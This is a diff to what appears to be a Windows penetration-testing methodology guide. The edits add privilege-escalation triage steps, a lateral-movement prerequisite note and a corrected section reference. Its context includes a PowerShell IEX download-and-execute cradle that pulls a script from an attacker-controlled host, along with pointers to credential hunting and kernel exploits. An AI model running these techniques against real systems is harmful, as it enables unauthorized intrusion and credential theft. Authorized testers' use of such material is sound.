@@ -720,7 +720,7 @@ Invoke-PrivescCheck -Categories Services,Credentials -Extended
 IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PrivescCheck.ps1')
 ```
 
-> Output is grouped by severity (`HIGH`/`MEDIUM`/`LOW`/`INFO`); start with `HIGH` items — they map directly to the privesc primitives in 4.2-4.21.
+> Output is grouped by severity (`HIGH`/`MEDIUM`/`LOW`/`INFO`); start with `HIGH` items — they map directly to the privesc primitives in 4.2-4.21. Priority triage: `whoami /priv` (4.2) → services (4.3) → scheduled tasks (4.6) → stored creds (4.7) → kernel (4.9). **Nothing found?** → check internal services on 127.0.0.1 (port-forward and attack), hunt creds in files/registry (4.7/4.17), or pivot to AD attacks if domain-joined (active-directory-methodology.md).
 
 #### Native Manual Enumeration (No Tools Required)
 ```powershell
@@ -4846,6 +4846,8 @@ Enter-PSSession -ComputerName <TARGET> -Credential $cred -Authentication CredSSP
 
 **Goal:** Move to other machines in the network using obtained credentials or hashes.
 
+> **Prerequisite:** most methods in 5.1 require local admin creds, an NT hash, or a Kerberos ticket on the *target*. If you only have a low-priv shell, return to Phase 4 (credential extraction from 4.7/4.17) first.
+
 ### 5.1 Remote Execution Methods
 
 | Method | Port | Requires Local Admin | Tool |
@@ -5374,7 +5376,7 @@ whoami /priv
     ├── Check AlwaysInstallElevated → MSI payload (see 4.5)
     ├── Check stored creds   → cmdkey /list → runas /savecred (see 4.7)
     ├── Check patch level    → systeminfo → kernel exploits (see 4.9)
-    ├── Check ADCS           → certipy / Certify (see 2.7)
+    ├── Check ADCS           → certipy / Certify (see 2.8)
     └── Run WinPEAS / SharpUp for anything missed (see 4.1)
 ```
 
